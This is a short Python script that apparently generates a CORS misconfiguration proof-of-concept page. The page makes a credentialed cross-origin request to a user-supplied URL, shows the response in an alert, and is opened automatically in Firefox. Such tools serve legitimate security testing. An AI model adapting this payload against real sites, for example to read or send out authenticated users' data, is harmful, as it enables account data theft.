#!/usr/bin/python3
import argparse
import sys
import os

parser = argparse.ArgumentParser()
parser.add_argument('-u', '--url', help="Url, example http://www.google.com", action="store")
args = parser.parse_args()

if len(sys.argv) == 1:  # If no arguments print help
    parser.print_help()

if args.url:  # This is the cors request
    template = f"""
    <script>
    var invocation = new XMLHttpRequest();
    
      invocation.onreadystatechange = function() {{
        if (invocation.readyState == XMLHttpRequest.DONE) {{
          alert(invocation.response);
        }}
      }}
    
    function cors(){{
      if(invocation) {{
        invocation.open('GET', "{args.url}", true);
        invocation.withCredentials = true;
        invocation.send(); 
      }}
    }}
    
    cors();
    </script>
    
    """

    with open('cors.html', 'w') as cors:  # write the cors
        cors.write(template)

    os.system("firefox cors.html &")  # Open CORS file
